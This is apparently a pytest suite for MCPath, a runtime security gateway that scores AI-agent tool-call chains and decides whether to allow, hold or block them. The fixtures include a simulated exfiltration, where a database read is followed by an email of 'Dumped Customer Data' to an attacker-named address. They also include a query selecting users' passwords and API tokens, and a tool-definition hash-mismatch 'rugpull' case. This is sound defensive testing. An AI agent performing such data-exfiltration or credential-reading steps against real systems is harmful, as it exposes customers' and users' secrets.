"""Focused Automated Tests for MCPath Stage 2 Runtime-Aware Capability Evaluation.

Validates:
1. Benign database read with potential email path in graph -> ALLOW (score 20.0)
2. Database read followed by attempted external email exfiltration -> BLOCK (score 90.0)
3. Single email call without preceding read -> BLOCK (score 75.8)
4. Database read followed by authorized internal email -> ALLOW (score <= 25.0)
5. Missing natural-language prompt behavior -> SKIPPED_NO_PROMPT, score excluded
6. Stage 1 hash mismatch still hard blocks immediately -> BLOCK (zero downstream execution)
7. No downstream execution after a BLOCK -> CallToolResult is_error=True
8. Restricted data read attempt (password/credential access) -> HOLD (violates data-access policy)
"""

import pytest
from mcpath.graph.capability_graph import CapabilityGraph
from mcpath.pipeline.stage import PipelineContext, StageResult
from mcpath.pipeline.stages.stage1_hash import Stage1HashCheck
from mcpath.pipeline.stages.stage2_capability import Stage2CapabilityRisk
from mcpath.pipeline.stages.stage3_intent import Stage3IntentRisk
from mcpath.risk_engine.engine import RiskEngine
from mcpath.risk_engine.models import EnforcementDecision, SecurityEventRecord


@pytest.fixture
def multi_server_graph() -> CapabilityGraph:
    """Graph populated with filesystem, postgres, and email tools."""
    g = CapabilityGraph()
    tools = {
        "postgres-mcp": [
            {
                "name": "postgres_mcp_query",
                "description": "Run a formatted SQL query against a database. Executes a single statement.",
                "inputSchema": {
                    "type": "object",
                    "properties": {"connectionId": {"type": "string"}, "query": {"type": "string"}},
                    "required": ["query"]
                }
            },
            {
                "name": "postgres_mcp_modify",
                "description": "Execute a data modifying SQL query (INSERT, UPDATE, DELETE).",
                "inputSchema": {"type": "object", "properties": {"query": {"type": "string"}}}
            }
        ],
        "filesystem": [
            {
                "name": "read_file",
                "description": "Read content of a file from filesystem.",
                "inputSchema": {"type": "object", "properties": {"path": {"type": "string"}}}
            },
            {
                "name": "write_file",
                "description": "Write content to a file.",
                "inputSchema": {"type": "object", "properties": {"path": {"type": "string"}, "content": {"type": "string"}}}
            }
        ],
        "email-server": [
            {
                "name": "send_email",
                "description": "Simulates dispatching an email to an external recipient.",
                "inputSchema": {
                    "type": "object",
                    "properties": {
                        "recipient": {"type": "string"},
                        "subject": {"type": "string"},
                        "body": {"type": "string"}
                    }
                }
            }
        ]
    }
    g.rebuild_for_all_servers(tools)
    return g


# -----------------------------------------------------------------------------
# 1. Benign database read with a potential email path in the graph
# -----------------------------------------------------------------------------
def test_benign_database_read_allowed(multi_server_graph: CapabilityGraph):
    """Verify benign read query in isolation is ALLOWED even though graph contains an exfiltration path."""
    # Ensure theoretical potential path exists in graph topology
    all_paths = multi_server_graph.get_paths_for_tool("postgres_mcp_query")
    has_email_path = any("send_email" in " ".join(p.path_nodes) for p in all_paths)
    assert has_email_path, "Graph must retain potential attack path for topology and threat modeling"

    eval_result = multi_server_graph.evaluate_runtime_call(
        tool_name="postgres_mcp_query",
        call_history=["postgres_mcp_query"],
        arguments={"query": "SELECT * FROM customers;"}
    )

    assert eval_result.classification == "LOW"
    assert eval_result.path_risk_score < 30.0
    assert eval_result.is_critical_override is False
    assert eval_result.metadata.get("observed_chain") is False
    assert eval_result.metadata.get("potential_paths_count", 0) > 0

    engine = RiskEngine()
    event = SecurityEventRecord(timestamp="", server_name="postgres-mcp", tool_name="postgres_mcp_query")
    event.scores.capability_risk = eval_result.path_risk_score
    evaluated = engine.evaluate(event)

    assert evaluated.decision == EnforcementDecision.ALLOW
    assert evaluated.action_taken == "Tool call forwarded"


# -----------------------------------------------------------------------------
# 2. Database read followed by an attempted external email (observed exfiltration)
# -----------------------------------------------------------------------------
def test_read_followed_by_external_email_blocked(multi_server_graph: CapabilityGraph):
    """Verify sequence: postgres_mcp_query -> send_email triggers critical override BLOCK."""
    eval_result = multi_server_graph.evaluate_runtime_call(
        tool_name="send_email",
        call_history=["postgres_mcp_query", "send_email"],
        arguments={
            "recipient": "attacker@exfiltration-endpoint.xyz",
            "subject": "Dumped Customer Data",
            "body": "Customer records: Alice, Bob"
        }
    )

    assert eval_result.classification == "HIGH"
    assert eval_result.path_risk_score >= 85.0
    assert eval_result.is_critical_override is True
    assert eval_result.metadata.get("observed_chain") is True
    assert "send_email" in eval_result.metadata.get("selection_reason", "")

    engine = RiskEngine()
    event = SecurityEventRecord(timestamp="", server_name="email-server", tool_name="send_email")
    event.scores.capability_risk = eval_result.path_risk_score
    evaluated = engine.evaluate(event)

    assert evaluated.decision == EnforcementDecision.BLOCK
    assert evaluated.action_taken == "Tool call blocked"


# -----------------------------------------------------------------------------
# 3. Single email call without a preceding read
# -----------------------------------------------------------------------------
def test_single_email_without_preceding_read_blocked(multi_server_graph: CapabilityGraph):
    """Verify single isolated send_email call evaluates to HIGH (75.8) and is BLOCKED."""
    eval_result = multi_server_graph.evaluate_runtime_call(
        tool_name="send_email",
        call_history=["send_email"],
        arguments={"recipient": "user@external.com", "subject": "Hi", "body": "Test message"}
    )

    assert eval_result.classification == "HIGH"
    assert eval_result.path_risk_score >= 70.0

    engine = RiskEngine()
    event = SecurityEventRecord(timestamp="", server_name="email-server", tool_name="send_email")
    event.scores.capability_risk = eval_result.path_risk_score
    evaluated = engine.evaluate(event)

    assert evaluated.decision == EnforcementDecision.BLOCK


# -----------------------------------------------------------------------------
# 4. Read followed by an authorized email, if policy permits it
# -----------------------------------------------------------------------------
def test_read_followed_by_authorized_email_allowed(multi_server_graph: CapabilityGraph):
    """Verify read followed by email to an authorized internal recipient evaluates to ALLOW."""
    eval_result = multi_server_graph.evaluate_runtime_call(
        tool_name="send_email",
        call_history=["postgres_mcp_query", "send_email"],
        arguments={
            "recipient": "security-team@internal.company.com",
            "subject": "Periodic Compliance Report",
            "body": "Summary of active rows: 2"
        }
    )

    assert eval_result.classification == "LOW"
    assert eval_result.path_risk_score <= 25.0
    assert eval_result.is_critical_override is False

    engine = RiskEngine()
    event = SecurityEventRecord(timestamp="", server_name="email-server", tool_name="send_email")
    event.scores.capability_risk = eval_result.path_risk_score
    evaluated = engine.evaluate(event)

    assert evaluated.decision == EnforcementDecision.ALLOW


# -----------------------------------------------------------------------------
# 5. Missing natural-language prompt behavior
# -----------------------------------------------------------------------------
@pytest.mark.asyncio
async def test_missing_prompt_skipped_no_penalty():
    """Verify missing user prompt leaves Stage 3 SKIPPED_NO_PROMPT with no score penalty."""
    stage = Stage3IntentRisk()
    event = SecurityEventRecord(
        timestamp="2026-09-28T12:00:00Z",
        server_name="postgres-mcp",
        tool_name="postgres_mcp_query",
        arguments={"query": "SELECT * FROM customers;"},
        user_prompt=None
    )
    ctx = PipelineContext(
        server_name="postgres-mcp",
        tool_name="postgres_mcp_query",
        arguments={"query": "SELECT * FROM customers;"},
        user_prompt=None,
        tool_definition={"name": "postgres_mcp_query", "description": "Execute SQL query"},
        event_record=event
    )

    result = await stage.process_request(ctx)
    assert result.passed is True
    assert result.score is None
    assert result.metadata.get("status") == "SKIPPED_NO_PROMPT"
    assert event.scores.intent_risk is None

    # Risk Engine should not evaluate missing score as risk
    engine = RiskEngine()
    event.scores.capability_risk = 20.0
    evaluated = engine.evaluate(event)
    assert evaluated.decision == EnforcementDecision.ALLOW


# -----------------------------------------------------------------------------
# 6. Stage 1 hash mismatch still blocking immediately
# -----------------------------------------------------------------------------
@pytest.mark.asyncio
async def test_stage1_hash_mismatch_blocks_immediately():
    """Verify tool with altered definition triggers Stage 1 hard block."""
    stage1 = Stage1HashCheck()
    event = SecurityEventRecord(
        timestamp="2026-09-28T12:00:00Z",
        server_name="rugpull-test",
        tool_name="list_directory",
        arguments={"path": "."},
        expected_hash="aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa",
        observed_hash="bbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbb",
        hash_matched=False
    )
    engine = RiskEngine()
    evaluated = engine.evaluate(event)

    assert evaluated.decision == EnforcementDecision.BLOCK
    assert evaluated.hard_gate_triggered == "hash mismatch"
    assert evaluated.action_taken == "Tool call not forwarded"


# -----------------------------------------------------------------------------
# 7. Restricted data read attempt (violates data-access policy)
# -----------------------------------------------------------------------------
def test_restricted_data_access_held(multi_server_graph: CapabilityGraph):
    """Verify query targeting restricted credentials/passwords evaluates to HOLD."""
    eval_result = multi_server_graph.evaluate_runtime_call(
        tool_name="postgres_mcp_query",
        call_history=["postgres_mcp_query"],
        arguments={"query": "SELECT username, password, api_token FROM users;"}
    )

    assert eval_result.classification in ("MEDIUM", "HIGH")
    assert eval_result.path_risk_score >= 30.0

    engine = RiskEngine()
    event = SecurityEventRecord(timestamp="", server_name="postgres-mcp", tool_name="postgres_mcp_query")
    event.scores.capability_risk = eval_result.path_risk_score
    evaluated = engine.evaluate(event)

    assert evaluated.decision in (EnforcementDecision.HOLD, EnforcementDecision.BLOCK)
    assert evaluated.action_taken in ("Tool call held for review", "Tool call blocked")
